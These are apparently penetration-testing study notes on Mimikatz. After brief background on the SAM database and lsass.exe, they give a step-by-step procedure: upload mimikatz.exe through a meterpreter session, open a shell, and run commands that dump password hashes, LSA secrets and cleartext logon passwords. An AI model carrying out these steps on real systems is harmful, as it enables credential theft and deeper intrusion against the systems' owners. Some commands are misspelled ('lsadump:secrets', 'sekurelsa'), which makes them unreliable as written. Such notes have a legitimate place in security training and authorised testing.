- MimiKatz is a Post-Exploitation tool that extracts clear text passwords, hashes and Kerberos tickets from memory.

- The SAM (Security Account Manager) database, is a database file on Windows systems that stores hashed user passwords.

- Mimikatz can be used to extract hashed from the `lsass.exe` process memory where hashes are cached.


## **What to do when we have initial access (E.g. meterpreter session):**

1. Go to Temp directory.
2. upload MimiKatz there: `upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe`
3. then run the `shell` command.
4. go the the location of the file we uploaded and execute `Mimikatz.exe`  from there....
5. use: `lsadump::sam` this will provide more information than Kiwi would give.
6. use : `lsadump:secrets` same as the lsa_dump_secrets command from Kiwi.
7. use: `sekurelsa::logonpasswords` Might display Logon clear text passwords.
